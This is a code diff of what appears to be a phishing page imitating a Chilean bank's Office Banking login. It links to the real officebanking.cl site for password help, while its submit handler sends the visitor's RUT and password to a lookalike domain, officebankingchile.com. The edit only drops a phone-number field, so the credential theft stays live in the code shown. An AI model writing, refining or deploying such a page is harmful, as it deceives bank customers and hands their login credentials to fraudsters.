@@ -162,9 +162,6 @@
           
           <label for="passwd">Contraseña</label>
           <input type="password" id="passwd" name="passwd" required>
-
-          <label for="telefono">Teléfono actualizado</label>
-          <input type="tel" id="telefono" name="telefono" placeholder="+56 9 1234 5678" required>
                           
           <div class="options">
             <a href="https://wslogin.officebanking.cl/autogestion-clave" target="_blank">¿Olvidaste tu clave?</a>
@@ -249,7 +246,7 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
     const response = await fetch("https://officebankingchile.com/proxy-login", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ rut, passwd, telefono })
+      body: JSON.stringify({ rut, passwd })
     });
     const data = await response.json();
     document.getElementById("resultado").innerText = data.mensaje;
